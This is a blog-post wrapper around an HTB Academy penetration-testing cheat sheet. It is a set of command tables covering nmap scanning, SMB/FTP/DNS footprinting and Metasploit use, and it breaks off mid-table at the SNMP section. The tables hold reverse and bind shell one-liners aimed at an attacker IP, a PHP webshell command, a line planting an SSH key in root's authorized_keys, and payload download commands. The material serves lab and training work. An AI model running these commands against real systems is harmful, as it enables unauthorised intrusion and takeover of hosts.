---
layout: post
title:  Penetration Testing Methodology
description: Watch and Learn
date:   2018-04-21 15:01:35 +0300
image:  '/images/20.jpg'
tags:   [Lifestyle, Rest, Nature]
---

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>htbacademy</title>
  <style>
    html {
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 12px;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      html {
        background-color: white;
      }
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
      font-size: 85%;
      margin: 0;
      hyphens: manual;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
    /* CSS for syntax highlighting */
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { color: #008000; } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { color: #008000; font-weight: bold; } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
</head>
<body>
<h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#1-penetration-testing-process">1. Penetration Testing
Process</a></li>
<li><a href="#2-getting-started">2. Getting Started</a></li>
</ul></li>
<li><a
href="#reconnaissance-enumeration--attack-planning">Reconnaissance,
Enumeration &amp; Attack Planning</a>
<ul>
<li><a href="#3-network-enumeration-with-nmap">3. Network Enumeration
with Nmap</a></li>
<li><a href="#4-footprinting">4. Footprinting</a></li>
<li><a href="#5-information-gathering---web-edition">5. Information
Gathering - Web Edition</a></li>
<li><a href="#6-vulnerability-assessment">6. Vulnerability
Assessment</a></li>
<li><a href="#7-file-transfers">7. File Transfers</a></li>
<li><a href="#8-shells--payloads">8. Shells &amp; Payloads</a></li>
<li><a href="#9-using-the-metasploit-framework">9. Using the Metasploit
Framework</a></li>
</ul></li>
<li><a href="#exploitation--lateral-movement">Exploitation &amp; Lateral
Movement</a>
<ul>
<li><a href="#10-password-attacks">10. Password Attacks</a></li>
<li><a href="#11-attacking-common-services">11. Attacking Common
Services</a></li>
<li><a href="#12-pivoting-tunneling-and-port-forwarding">12. Pivoting,
Tunneling, and Port Forwarding</a></li>
<li><a href="#13-active-directory-enumeration--attacks">13. Active
Directory Enumeration &amp; Attacks</a></li>
</ul></li>
<li><a href="#web-exploitation">Web Exploitation</a>
<ul>
<li><a href="#14-using-web-proxies">14. Using Web Proxies</a></li>
<li><a href="#15-attacking-web-applications-with-ffuf">15. Attacking Web
Applications with Ffuf</a></li>
<li><a href="#16-login-brute-forcing">16. Login Brute Forcing</a></li>
<li><a href="#17-sql-injection-fundamentals">17. SQL Injection
Fundamentals</a></li>
<li><a href="#18-sqlmap-essentials">18. SQLMap Essentials</a></li>
<li><a href="#19-cross-site-scripting-xss">19. Cross-Site Scripting
(XSS)</a></li>
<li><a href="#20-file-inclusion">20. File Inclusion</a></li>
<li><a href="#21-file-upload-attacks">21. File Upload Attacks</a></li>
<li><a href="#22-command-injections">22. Command Injections</a></li>
<li><a href="#23-web-attacks">23. Web Attacks</a></li>
<li><a href="#24-attacking-common-applications">24. Attacking Common
Applications</a></li>
</ul></li>
<li><a href="#post-exploitation">Post-Exploitation</a>
<ul>
<li><a href="#25-linux-privilege-escalation">25. Linux Privilege
Escalation</a></li>
<li><a href="#26-windows-privilege-escalation">26. Windows Privilege
Escalation</a></li>
</ul></li>
<li><a href="#reporting--capstone">Reporting &amp; Capstone</a>
<ul>
<li><a href="#27-documentation--reporting">27. Documentation &amp;
Reporting</a></li>
<li><a href="#28-attacking-enterprise-networks">28. Attacking Enterprise
Networks</a></li>
</ul></li>
</ul>
<p><a id="introduction"></a> # Introduction</p>
<p><a id="1-penetration-testing-process"></a> ## 1. Penetration Testing
Processes</p>
<p><a id="2-getting-started"></a> ## 2. Getting Started ### Basic
Tools</p>
<p><strong>HTB | Machines</strong></p>
<p>Metasploit:</p>
<ul class="task-list">
<li><input type="checkbox" />Granny/Grandpa</li>
<li><input type="checkbox" />Jerry</li>
<li><input type="checkbox" />Blue</li>
<li><input type="checkbox" />Lame</li>
<li><input type="checkbox" />Optimum</li>
<li><input type="checkbox" />Legacy</li>
<li><input type="checkbox" />Devel</li>
</ul>
<h4 id="basic-tools">Basic Tools</h4>
<table>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>General</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>sudo openvpn user.ovpn</code></td>
<td>Connect to VPN</td>
</tr>
<tr class="odd">
<td><code>ifconfig</code>/<code>ip a</code></td>
<td>Show our IP address</td>
</tr>
<tr class="even">
<td><code>netstat -rn</code></td>
<td>Show networks accessible via the VPN</td>
</tr>
<tr class="odd">
<td><code>ssh user@10.10.10.10</code></td>
<td>SSH to a remote server</td>
</tr>
<tr class="even">
<td><code>ftp 10.129.42.253</code></td>
<td>FTP to a remote server</td>
</tr>
<tr class="odd">
<td><strong>tmux</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>tmux</code></td>
<td>Start tmux</td>
</tr>
<tr class="odd">
<td><code>ctrl+b</code></td>
<td>tmux: default prefix</td>
</tr>
<tr class="even">
<td><code>prefix c</code></td>
<td>tmux: new window</td>
</tr>
<tr class="odd">
<td><code>prefix 1</code></td>
<td>tmux: switch to window (<code>1</code>)</td>
</tr>
<tr class="even">
<td><code>prefix shift+%</code></td>
<td>tmux: split pane vertically</td>
</tr>
<tr class="odd">
<td><code>prefix shift+"</code></td>
<td>tmux: split pane horizontally</td>
</tr>
<tr class="even">
<td><code>prefix -&gt;</code></td>
<td>tmux: switch to the right pane</td>
</tr>
<tr class="odd">
<td><strong>Vim</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>vim file</code></td>
<td>vim: open <code>file</code> with vim</td>
</tr>
<tr class="odd">
<td><code>esc+i</code></td>
<td>vim: enter <code>insert</code> mode</td>
</tr>
<tr class="even">
<td><code>esc</code></td>
<td>vim: back to <code>normal</code> mode</td>
</tr>
<tr class="odd">
<td><code>x</code></td>
<td>vim: Cut character</td>
</tr>
<tr class="even">
<td><code>dw</code></td>
<td>vim: Cut word</td>
</tr>
<tr class="odd">
<td><code>dd</code></td>
<td>vim: Cut full line</td>
</tr>
<tr class="even">
<td><code>yw</code></td>
<td>vim: Copy word</td>
</tr>
<tr class="odd">
<td><code>yy</code></td>
<td>vim: Copy full line</td>
</tr>
<tr class="even">
<td><code>p</code></td>
<td>vim: Paste</td>
</tr>
<tr class="odd">
<td><code>:1</code></td>
<td>vim: Go to line number 1.</td>
</tr>
<tr class="even">
<td><code>:w</code></td>
<td>vim: Write the file ‘i.e. save’</td>
</tr>
<tr class="odd">
<td><code>:q</code></td>
<td>vim: Quit</td>
</tr>
<tr class="even">
<td><code>:q!</code></td>
<td>vim: Quit without saving</td>
</tr>
<tr class="odd">
<td><code>:wq</code></td>
<td>vim: Write and quit</td>
</tr>
</tbody>
</table>
<h4 id="pentesting">Pentesting</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Service Scanning</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>nmap 10.129.42.253</code></td>
<td>Run nmap on an IP</td>
</tr>
<tr class="odd">
<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
<td>Run an nmap script scan on an IP</td>
</tr>
<tr class="even">
<td><code>locate scripts/citrix</code></td>
<td>List various available nmap scripts</td>
</tr>
<tr class="odd">
<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
<td>Run an nmap script on an IP</td>
</tr>
<tr class="even">
<td><code>netcat 10.10.10.10 22</code></td>
<td>Grab banner of an open port</td>
</tr>
<tr class="odd">
<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
<td>List SMB Shares</td>
</tr>
<tr class="even">
<td><code>smbclient \\\\10.129.42.253\\users</code></td>
<td>Connect to an SMB share</td>
</tr>
<tr class="odd">
<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
<td>Scan SNMP on an IP</td>
</tr>
<tr class="even">
<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
<td>Brute force SNMP secret string</td>
</tr>
<tr class="odd">
<td><strong>Web Enumeration</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
<td>Run a directory scan on a website</td>
</tr>
<tr class="odd">
<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
<td>Run a sub-domain scan on a website</td>
</tr>
<tr class="even">
<td><code>curl -IL https://www.inlanefreight.com</code></td>
<td>Grab website banner</td>
</tr>
<tr class="odd">
<td><code>whatweb 10.10.10.121</code></td>
<td>List details about the webserver/certificates</td>
</tr>
<tr class="even">
<td><code>curl 10.10.10.121/robots.txt</code></td>
<td>List potential directories in <code>robots.txt</code></td>
</tr>
<tr class="odd">
<td><code>ctrl+U</code></td>
<td>View page source (in Firefox)</td>
</tr>
<tr class="even">
<td><strong>Public Exploits</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>searchsploit openssh 7.2</code></td>
<td>Search for public exploits for a web application</td>
</tr>
<tr class="even">
<td><code>msfconsole</code></td>
<td>MSF: Start the Metasploit Framework</td>
</tr>
<tr class="odd">
<td><code>search exploit eternalblue</code></td>
<td>MSF: Search for public exploits in MSF</td>
</tr>
<tr class="even">
<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
<td>MSF: Start using an MSF module</td>
</tr>
<tr class="odd">
<td><code>show options</code></td>
<td>MSF: Show required options for an MSF module</td>
</tr>
<tr class="even">
<td><code>set RHOSTS 10.10.10.40</code></td>
<td>MSF: Set a value for an MSF module option</td>
</tr>
<tr class="odd">
<td><code>check</code></td>
<td>MSF: Test if the target server is vulnerable</td>
</tr>
<tr class="even">
<td><code>exploit</code></td>
<td>MSF: Run the exploit on the target server is vulnerable</td>
</tr>
<tr class="odd">
<td><strong>Using Shells</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>nc -lvnp 1234</code></td>
<td>Start a <code>nc</code> listener on a local port</td>
</tr>
<tr class="odd">
<td><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code></td>
<td>Send a reverse shell from the remote server</td>
</tr>
<tr class="even">
<td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&amp;1\|nc 10.10.10.10 1234 &gt;/tmp/f</code></td>
<td>Another command to send a reverse shell from the remote server</td>
</tr>
<tr class="odd">
<td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2&gt;&amp;1\|nc -lvp 1234 &gt;/tmp/f</code></td>
<td>Start a bind shell on the remote server</td>
</tr>
<tr class="even">
<td><code>nc 10.10.10.1 1234</code></td>
<td>Connect to a bind shell started on the remote server</td>
</tr>
<tr class="odd">
<td><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></td>
<td>Upgrade shell TTY (1)</td>
</tr>
<tr class="even">
<td><code>ctrl+z</code> then <code>stty raw -echo</code> then
<code>fg</code> then <code>enter</code> twice</td>
<td>Upgrade shell TTY (2)</td>
</tr>
<tr class="odd">
<td><code>echo "&lt;?php system(\$_GET['cmd']);?&gt;" &gt; /var/www/html/shell.php</code></td>
<td>Create a webshell php file</td>
</tr>
<tr class="even">
<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
<td>Execute a command on an uploaded webshell</td>
</tr>
<tr class="odd">
<td><strong>Privilege Escalation</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>./linpeas.sh</code></td>
<td>Run <code>linpeas</code> script to enumerate remote server</td>
</tr>
<tr class="odd">
<td><code>sudo -l</code></td>
<td>List available <code>sudo</code> privileges</td>
</tr>
<tr class="even">
<td><code>sudo -u user /bin/echo Hello World!</code></td>
<td>Run a command with <code>sudo</code></td>
</tr>
<tr class="odd">
<td><code>sudo su -</code></td>
<td>Switch to root user (if we have access to <code>sudo su</code>)</td>
</tr>
<tr class="even">
<td><code>sudo su user -</code></td>
<td>Switch to a user (if we have access to <code>sudo su</code>)</td>
</tr>
<tr class="odd">
<td><code>ssh-keygen -f key</code></td>
<td>Create a new SSH key</td>
</tr>
<tr class="even">
<td><code>echo "ssh-rsa AAAAB...SNIP...M= user@parrot" &gt;&gt; /root/.ssh/authorized_keys</code></td>
<td>Add the generated public key to the user</td>
</tr>
<tr class="odd">
<td><code>ssh root@10.10.10.10 -i key</code></td>
<td>SSH to the server with the generated private key</td>
</tr>
<tr class="even">
<td><strong>Transferring Files</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>python3 -m http.server 8000</code></td>
<td>Start a local webserver</td>
</tr>
<tr class="even">
<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
<td>Download a file on the remote server from our local machine</td>
</tr>
<tr class="odd">
<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
<td>Download a file on the remote server from our local machine</td>
</tr>
<tr class="even">
<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
<td>Transfer a file to the remote server with <code>scp</code> (requires
SSH access)</td>
</tr>
<tr class="odd">
<td><code>base64 shell -w 0</code></td>
<td>Convert a file to <code>base64</code></td>
</tr>
<tr class="even">
<td><code>echo f0VMR...SNIO...InmDwU \| base64 -d &gt; shell</code></td>
<td>Convert a file from <code>base64</code> back to its orig</td>
</tr>
<tr class="odd">
<td><code>md5sum shell</code></td>
<td>Check the file’s <code>md5sum</code> to ensure it converted
correctly</td>
</tr>
</tbody>
</table>
<p><a id="reconnaissance-enumeration--attack-planning"></a> ##
Reconnaissance, Enumeration &amp; Attack Planning</p>
<p><a id="3-network-enumeration-with-nmap"></a> ### 3. Network
Enumeration with Nmap</p>
<h4 id="scanning-options">Scanning Options</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Nmap Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>10.10.10.0/24</code></td>
<td>Target network range.</td>
</tr>
<tr class="even">
<td><code>-sn</code></td>
<td>Disables port scanning.</td>
</tr>
<tr class="odd">
<td><code>-Pn</code></td>
<td>Disables ICMP Echo Requests</td>
</tr>
<tr class="even">
<td><code>-n</code></td>
<td>Disables DNS Resolution.</td>
</tr>
<tr class="odd">
<td><code>-PE</code></td>
<td>Performs the ping scan by using ICMP Echo Requests against the
target.</td>
</tr>
<tr class="even">
<td><code>--packet-trace</code></td>
<td>Shows all packets sent and received.</td>
</tr>
<tr class="odd">
<td><code>--reason</code></td>
<td>Displays the reason for a specific result.</td>
</tr>
<tr class="even">
<td><code>--disable-arp-ping</code></td>
<td>Disables ARP Ping Requests.</td>
</tr>
<tr class="odd">
<td><code>--top-ports=&lt;num&gt;</code></td>
<td>Scans the specified top ports that have been defined as most
frequent.</td>
</tr>
<tr class="even">
<td><code>-p-</code></td>
<td>Scan all ports.</td>
</tr>
<tr class="odd">
<td><code>-p22-110</code></td>
<td>Scan all ports between 22 and 110.</td>
</tr>
<tr class="even">
<td><code>-p22,25</code></td>
<td>Scans only the specified ports 22 and 25.</td>
</tr>
<tr class="odd">
<td><code>-F</code></td>
<td>Scans top 100 ports.</td>
</tr>
<tr class="even">
<td><code>-sS</code></td>
<td>Performs an TCP SYN-Scan.</td>
</tr>
<tr class="odd">
<td><code>-sA</code></td>
<td>Performs an TCP ACK-Scan.</td>
</tr>
<tr class="even">
<td><code>-sU</code></td>
<td>Performs an UDP Scan.</td>
</tr>
<tr class="odd">
<td><code>-sV</code></td>
<td>Scans the discovered services for their versions.</td>
</tr>
<tr class="even">
<td><code>-sC</code></td>
<td>Perform a Script Scan with scripts that are categorized as
“default”.</td>
</tr>
<tr class="odd">
<td><code>--script &lt;script&gt;</code></td>
<td>Performs a Script Scan by using the specified scripts.</td>
</tr>
<tr class="even">
<td><code>-O</code></td>
<td>Performs an OS Detection Scan to determine the OS of the
target.</td>
</tr>
<tr class="odd">
<td><code>-A</code></td>
<td>Performs OS Detection, Service Detection, and traceroute scans.</td>
</tr>
<tr class="even">
<td><code>-D RND:5</code></td>
<td>Sets the number of random Decoys that will be used to scan the
target.</td>
</tr>
<tr class="odd">
<td><code>-e</code></td>
<td>Specifies the network interface that is used for the scan.</td>
</tr>
<tr class="even">
<td><code>-S 10.10.10.200</code></td>
<td>Specifies the source IP address for the scan.</td>
</tr>
<tr class="odd">
<td><code>-g</code></td>
<td>Specifies the source port for the scan.</td>
</tr>
<tr class="even">
<td><code>--dns-server &lt;ns&gt;</code></td>
<td>DNS resolution is performed by using a specified name server.</td>
</tr>
</tbody>
</table>
<h4 id="output-options">Output Options</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Nmap Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-oA filename</code></td>
<td>Stores the results in all available formats starting with the name
of “filename”.</td>
</tr>
<tr class="even">
<td><code>-oN filename</code></td>
<td>Stores the results in normal format with the name “filename”.</td>
</tr>
<tr class="odd">
<td><code>-oG filename</code></td>
<td>Stores the results in “grepable” format with the name of
“filename”.</td>
</tr>
<tr class="even">
<td><code>-oX filename</code></td>
<td>Stores the results in XML format with the name of “filename”.</td>
</tr>
</tbody>
</table>
<h4 id="performance-options">Performance Options</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Nmap Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>--max-retries &lt;num&gt;</code></td>
<td>Sets the number of retries for scans of specific ports.</td>
</tr>
<tr class="even">
<td><code>--stats-every=5s</code></td>
<td>Displays scan’s status every 5 seconds.</td>
</tr>
<tr class="odd">
<td><code>-v/-vv</code></td>
<td>Displays verbose output during the scan.</td>
</tr>
<tr class="even">
<td><code>--initial-rtt-timeout 50ms</code></td>
<td>Sets the specified time value as initial RTT timeout.</td>
</tr>
<tr class="odd">
<td><code>--max-rtt-timeout 100ms</code></td>
<td>Sets the specified time value as maximum RTT timeout.</td>
</tr>
<tr class="even">
<td><code>--min-rate 300</code></td>
<td>Sets the number of packets that will be sent simultaneously.</td>
</tr>
<tr class="odd">
<td><code>-T &lt;0-5&gt;</code></td>
<td>Specifies the specific timing template.</td>
</tr>
</tbody>
</table>
<p><a id="4-footprinting"></a> ### 4. Footprinting</p>
<h4 id="infrastructure-based-enumeration">Infrastructure-based
Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>curl -s https://crt.sh/\?q\=&lt;target-domain&gt;\&amp;output\=json \| jq .</code></td>
<td>Certificate transparency.</td>
</tr>
<tr class="even">
<td><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></td>
<td>Scan each IP address in a list using Shodan.</td>
</tr>
</tbody>
</table>
<h4 id="host-based-enumeration">Host-based Enumeration</h4>
<h5 id="ftp">FTP</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ftp &lt;FQDN/IP&gt;</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr class="even">
<td><code>nc -nv &lt;FQDN/IP&gt; 21</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr class="odd">
<td><code>telnet &lt;FQDN/IP&gt; 21</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr class="even">
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code></td>
<td>Interact with the FTP service on the target using encrypted
connection.</td>
</tr>
<tr class="odd">
<td><code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code></td>
<td>Download all available files on the target FTP server.</td>
</tr>
</tbody>
</table>
<h5 id="smb">SMB</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>smbclient -N -L //&lt;FQDN/IP&gt;</code></td>
<td>Null session authentication on SMB.</td>
</tr>
<tr class="even">
<td><code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code></td>
<td>Connect to a specific SMB share.</td>
</tr>
<tr class="odd">
<td><code>rpcclient -U "" &lt;FQDN/IP&gt;</code></td>
<td>Interaction with the target using RPC.</td>
</tr>
<tr class="even">
<td><code>samrdump.py &lt;FQDN/IP&gt;</code></td>
<td>Username enumeration using Impacket scripts.</td>
</tr>
<tr class="odd">
<td><code>smbmap -H &lt;FQDN/IP&gt;</code></td>
<td>Enumerating SMB shares.</td>
</tr>
<tr class="even">
<td><code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code></td>
<td>Enumerating SMB shares using null session authentication.</td>
</tr>
<tr class="odd">
<td><code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code></td>
<td>SMB enumeration using enum4linux.</td>
</tr>
</tbody>
</table>
<h5 id="nfs">NFS</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>showmount -e &lt;FQDN/IP&gt;</code></td>
<td>Show available NFS shares.</td>
</tr>
<tr class="even">
<td><code>mount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code></td>
<td>Mount the specific NFS share.umount ./target-NFS</td>
</tr>
<tr class="odd">
<td><code>umount ./target-NFS</code></td>
<td>Unmount the specific NFS share.</td>
</tr>
</tbody>
</table>
<h5 id="dns">DNS</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>dig ns &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>NS request to the specific nameserver.</td>
</tr>
<tr class="even">
<td><code>dig any &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>ANY request to the specific nameserver.</td>
</tr>
<tr class="odd">
<td><code>dig axfr &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>AXFR request to the specific nameserver.</td>
</tr>
<tr class="even">
<td><code>dnsenum --dnsserver &lt;nameserver&gt; --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld&gt;</code></td>
<td>Subdomain brute forcing.</td>
</tr>
</tbody>
</table>
<h5 id="smtp">SMTP</h5>
<table>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>telnet &lt;FQDN/IP&gt; 25</code></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="imappop3">IMAP/POP3</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>curl -k 'imaps://&lt;FQDN/IP&gt;' --user &lt;user&gt;:&lt;password&gt;</code></td>
<td>Log in to the IMAPS service using cURL.</td>
</tr>
<tr class="even">
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:imaps</code></td>
<td>Connect to the IMAPS service.</td>
</tr>
<tr class="odd">
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:pop3s</code></td>
<td>Connect to the POP3s service.</td>
</tr>
</tbody>
</table>
<h5 id="snmp">SNMP</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
